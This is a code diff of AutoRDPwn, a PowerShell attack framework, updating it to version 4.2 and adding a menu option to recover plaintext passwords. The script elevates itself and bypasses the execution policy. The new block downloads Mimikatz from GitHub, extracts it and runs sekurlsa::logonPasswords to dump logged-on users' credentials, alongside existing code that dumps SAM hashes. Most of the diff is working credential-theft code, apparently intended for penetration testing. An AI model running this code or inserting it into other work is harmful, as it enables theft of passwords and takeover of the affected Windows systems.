@@ -1,7 +1,7 @@
 ﻿if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs; exit }
 [Console]::OutputEncoding = [System.Text.Encoding]::GetEncoding("utf-8")
 $Host.UI.RawUI.BackgroundColor = 'Black' ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; $Host.PrivateData.ErrorForegroundColor = 'Red' ; $Host.PrivateData.WarningForegroundColor = 'Magenta' ; $Host.PrivateData.DebugForegroundColor = 'Yellow' ; $Host.PrivateData.VerboseForegroundColor = 'Green' ; $Host.PrivateData.ProgressForegroundColor = 'White' ; $Host.PrivateData.ProgressBackgroundColor = 'Blue'
-$Host.UI.RawUI.WindowTitle = "AutoRDPwn - v4.0 - by @JoelGMSec"
+$Host.UI.RawUI.WindowTitle = "AutoRDPwn - v4.2 - by @JoelGMSec"
 $ErrorActionPreference = "SilentlyContinue" ; Set-StrictMode -Off
 
 function Show-Banner { Clear-Host
@@ -14,7 +14,7 @@ function Show-Banner { Clear-Host
      Write-Host "  \/                        " -NoNewLine -ForegroundColor Magenta ; Write-Host "       \/              " -NoNewLine -ForegroundColor Blue ; Write-Host "                \/ " -ForegroundColor Green
      Write-Host ""
      Write-Host "::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
-     Write-Host "::" -NoNewLine -ForegroundColor Gray ; Write-Host "  The Shadow Attack Framework" -NoNewLine -ForegroundColor Yellow ; Write-Host "  :: " -NoNewLine -ForegroundColor Gray ; Write-Host "v4.0" -NoNewLine -ForegroundColor Yellow ; Write-Host " ::" -NoNewLine -ForegroundColor Gray ; Write-Host "  Created by @JoelGMSec" -NoNewLine -ForegroundColor Yellow ; Write-Host "  ::" -ForegroundColor Gray
+     Write-Host "::" -NoNewLine -ForegroundColor Gray ; Write-Host "  The Shadow Attack Framework" -NoNewLine -ForegroundColor Yellow ; Write-Host "  :: " -NoNewLine -ForegroundColor Gray ; Write-Host "v4.2" -NoNewLine -ForegroundColor Yellow ; Write-Host " ::" -NoNewLine -ForegroundColor Gray ; Write-Host "  Created by @JoelGMSec" -NoNewLine -ForegroundColor Yellow ; Write-Host "  ::" -ForegroundColor Gray
      Write-Host "::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
      Write-Host "" }
 
@@ -69,7 +69,8 @@ if($Language -in 'English') {
   $txt4  = "Incorrect option, try again"
   $txt5  = "Choose how you want to launch the attack"
   $txt6  = "Choose the module you want to load"
-  $txt7  = "Recover local hashes"
+  $txt7a = "Recover local hashes"
+  $txt7b = "Recover plaintext passwords"
   $txt8  = "System"
   $txt9  = "detected, downloading Mimikatz.."
   $txt10 = "Semi-interactive console"
@@ -107,7 +108,8 @@ if($Language -in 'Spanish') {
   $txt4  = "Opción incorrecta, vuelve a intentarlo de nuevo"
   $txt5  = "Elige cómo quieres lanzar el ataque"
   $txt6  = "Elige el módulo que quieres cargar"
-  $txt7  = "Recuperar hashes locales"
+  $txt7a = "Recuperar hashes locales"
+  $txt7b = "Recuperar contraseñas en texto plano"
   $txt8  = "Sistema de"
   $txt9  = "detectado, descargando Mimikatz.."
   $txt10 = "Consola semi-interactiva"
@@ -229,7 +231,7 @@ if($Language -in 'Spanish') {
         'M' {
         Clear-Host; Show-Banner ; Write-Host "[1] - Mimikatz" ; Write-Host "[2] - $txt10" ; Write-Host "[M] - $txt12" ; Write-Host ""
         $module = Read-Host -Prompt "$txt6" ; Write-Host ""
-        if($module -like '1') { Clear-Host; Show-Banner ; Write-Host "[1] - $txt7" ; Write-Host ""
+        if($module -like '1') { Clear-Host; Show-Banner ; Write-Host "[1] - $txt7a" ; Write-Host "[2] - $txt7b" ; Write-Host "[M] - $txt12" ; Write-Host ""
         $mimikatz = Read-Host -Prompt "$txt6" ; Write-Host ""
         if($mimikatz -like '1') { Write-Host "$txt11" -ForegroundColor Green ; sleep -milliseconds 2000
 	$osarch = wmic path Win32_OperatingSystem get OSArchitecture | findstr 'bits' ; $system = $osarch.trim()
@@ -240,6 +242,16 @@ if($Language -in 'Spanish') {
 	if($system -in '64 bits') { $mimipath = ".\mimikatz\x64\" }
         powershell $mimipath\mimikatz.exe privilege::debug token::elevate lsadump::sam exit
         Write-Host "" ; pause ; del .\mimikatz.zip ; cmd /c "rd /s /q mimikatz" }
+        if($mimikatz -like '2') { Write-Host "$txt11" -ForegroundColor Green ; sleep -milliseconds 2000
+	$osarch = wmic path Win32_OperatingSystem get OSArchitecture | findstr 'bits' ; $system = $osarch.trim()
+        Write-Host "" ; Write-Host "$txt8 $system $txt9" -ForegroundColor Green
+	EnableTLS ; Invoke-WebRequest -Uri "https://github.com/gentilkiwi/mimikatz/releases/download/2.1.1-20180925/mimikatz_trunk.zip" -Outfile mimikatz.zip
+	Expand-Archive .\mimikatz.zip -Force
+	if($system -in '32 bits') { $mimipath = ".\mimikatz\Win32\" }
+	if($system -in '64 bits') { $mimipath = ".\mimikatz\x64\" }
+        powershell $mimipath\mimikatz.exe 'privilege::debug token::elevate sekurlsa::logonPasswords` full exit'
+        Write-Host "" ; pause ; del .\mimikatz.zip ; cmd /c "rd /s /q mimikatz" }
+        if($mimikatz -in '1','2','m') { $null }
         else { Write-Host "$txt4" -ForegroundColor Magenta }}
         if($module -like '2') { $console ="true" ; Write-Host "$txt11" -ForegroundColor Green }
         if($module -in '1','2','m') { $null }
